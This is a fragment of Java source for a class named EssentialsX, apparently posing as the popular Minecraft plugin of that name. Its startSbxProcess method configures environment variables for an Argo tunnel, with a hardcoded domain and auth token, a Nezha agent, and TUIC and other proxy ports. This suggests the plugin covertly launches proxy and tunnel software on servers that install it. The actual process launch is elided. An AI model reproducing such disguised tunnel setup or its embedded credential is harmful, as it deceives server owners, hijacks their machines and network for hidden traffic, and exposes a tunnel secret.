...
public class EssentialsX extends JavaPlugin {
    ...
    private void startSbxProcess() throws Exception {
        ...
        env.put("NEZHA_PORT", "");
        env.put("NEZHA_KEY", "");
        env.put("ARGO_PORT", "28561");
        env.put("ARGO_DOMAIN", "quartexnode-fr.free.us.kg");
        env.put("ARGO_AUTH", "eyJhIjoiZmQ5YjNkMDdkOWQxZWYxY2M4OGY2ZTJiNDE2OTNmZmUiLCJ0IjoiYjYwN2IzMDYtMjBmYy00NGRjLWJkYzktMWYzYjM0ODM1NzY2IiwicyI6IlltUXlOVEkzTVdVdFltRXlNaTAwWWpjMUxUazJOR0V0TkdJelltWmhNekE0WWpBeiJ9");
        env.put("S5_PORT", "");
        env.put("HY2_PORT", "");
        env.put("TUIC_PORT", "25054");
        env.put("ANYTLS_PORT", "");
